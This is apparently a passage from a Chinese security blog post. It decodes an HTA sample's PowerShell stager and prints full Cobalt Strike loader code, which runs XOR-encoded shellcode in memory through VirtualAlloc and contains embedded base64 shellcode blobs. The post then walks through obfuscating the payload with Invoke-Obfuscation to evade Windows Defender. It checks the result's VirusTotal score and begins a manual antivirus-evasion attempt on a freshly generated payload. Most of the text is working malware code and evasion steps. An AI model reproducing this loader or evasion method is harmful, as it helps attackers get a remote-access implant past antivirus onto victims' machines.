<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;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&#x27;</span>)<br><span class="hljs-variable">$ms</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream<br><span class="hljs-variable">$ms</span>.Write(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$data</span>.Length)<br><span class="hljs-variable">$ms</span>.Seek(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$sr</span> = <span class="hljs-built_in">New-Object</span> System.IO.StreamReader(<span class="hljs-built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="hljs-variable">$ms</span>, [<span class="hljs-type">System.IO.Compression.CompressionMode</span>]::Decompress))<br><span class="hljs-variable">$sr</span>.ReadToEnd() | <span class="hljs-built_in">set-clipboard</span><br></code></pre></td></tr></table></figure>
<p>该脚本首先经过base64解码，然后再进行gzip解压，来得到我们想要看到的hta的源码</p>
<blockquote>
<p>这里我犯了一个低级错误，在之前base64解码出来的结果里面，把多余的<code>.</code>都替换掉了，同时也将代码中原本的<code>.</code>也去掉了，故正确的代码应该长这样<br>当时也想到这个问题了，不知道为啥没有注意，挺怪的</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$s</span>=<span class="hljs-built_in">New-Object</span> IO.MemoryStream(,[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-string">&quot;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&quot;</span>));<span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> IO.StreamReader(<span class="hljs-built_in">New-Object</span> IO.Compression.GzipStream(<span class="hljs-variable">$s</span>,[<span class="hljs-type">IO.Compression.CompressionMode</span>]::Decompress))).ReadToEnd();<br></code></pre></td></tr></table></figure>

<p>结果会自动保存在剪贴板里<br>得到解压后的源码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">	Param ($var_module, $var_procedure)		</span><br><span class="hljs-string">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">	Param (</span><br><span class="hljs-string">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">	)</span><br><span class="hljs-string"></span><br><span class="hljs-string">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">	return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuAPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMeXZPYiMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCgNvYWFxbHRwZnEuKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXfyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEBoNEhMVDRITFw0SEBQjIyMjIw==&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">	$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>	<span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>分别用Windows Defender测试每一段代码，发现在<code>$var_code</code>中报毒<br>进一步对<code>$var_code</code>解码（我本地base64解出来都是乱码，挺怪的）<br>看别人的结果说能得到一串ASCII字符，而ASCII解码后得到一堆乱码，但在最后，可以发现攻击者的IP，也没什么其他可以获取的信息了</p>
<blockquote>
<p>总的来说  powershell的上线方式就是通过VirtualAlloc分配内存然后执行CS的shellcode,shellcode存放在了$var_code变量中</p>
</blockquote>
<h2 id="powershell免杀"><a href="#powershell免杀" class="headerlink" title="powershell免杀"></a>powershell免杀</h2><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><p>通过对上面hta文件的分析之后，我们知道Windows Defender是对<code>$var_code</code>进行了检测报毒，那我们需要做的就是将该部分进行混淆处理，来绕过Windows Defender的检测<br>这里先推荐一个开源的混淆工具<a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> ./<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1<br><span class="hljs-built_in">Invoke-Obfuscation</span><br></code></pre></td></tr></table></figure>
<p>根据其步骤安装，运行</p>
<p><img src="https://s2.loli.net/2022/08/16/4myYitWBsOSNvoJ.png" srcset="/img/loading.gif" lazyload alt="好酷炫的界面"></p>
<p>因为没有仔细去研究该工具的使用方法，就直接用的其他大佬的配置<br><code>Set scriptblock &#39;final_base64payload&#39;</code> <code>COMPRESS</code> <code>1</code>,该配置可以绕过Windows Defender，（也可以选择其他混淆方式来绕过不同的防火墙）该工具会根据该配置输出可以绕过Windows Defender的PowerShell命令<br><img src="https://s2.loli.net/2022/08/16/gSbkTOpM3fj1UCV.png" srcset="/img/loading.gif" lazyload></p>
<p><code>Out d:payload.ps1</code>将其输出<br><img src="https://s2.loli.net/2022/08/16/CyxmieSZpvrMLEc.png" srcset="/img/loading.gif" lazyload alt="得到payload.ps1"><br>将其新建的有效载荷替换掉$var_code中的内容，Windows Defender成功绕过</p>
<p>接着我们把他丢到<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/1a2e0851bbae380c43881d70f41835b4a22e74ae2c2daf45593ffb764fc6e9e9?nocache=1">virustotal</a>上看看效果</p>
<p><img src="https://s2.loli.net/2022/08/16/yg2twhGMiqX6HuQ.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://s2.loli.net/2022/08/16/EC8iXIbahkVWGSm.png" srcset="/img/loading.gif" lazyload><br>虽然可以绕过一些大厂的防火墙，例如：微软，腾讯，McAfee<br>但是16/59 感觉还是不太行那我们接下来试试手动免杀</p>
<h3 id="人工免杀"><a href="#人工免杀" class="headerlink" title="人工免杀"></a>人工免杀</h3><p>我们直接用CS生成一个powershell的payload，不然用之前hta中包含的话，几层base64又压缩啥的太麻烦了<br>先来看看源码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">	Param ($var_module, $var_procedure)		</span><br><span class="hljs-string">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">	Param (</span><br><span class="hljs-string">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">	)</span><br><span class="hljs-string"></span><br><span class="hljs-string">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">	return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktTjiMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMV0saZCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3RsdBUXGAN3UUpHRk1XDBYNExgDbmJwYQouKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNicyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMSDRIQEQ0RERQNEREUIyMjIyM=&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">	$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>	<span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
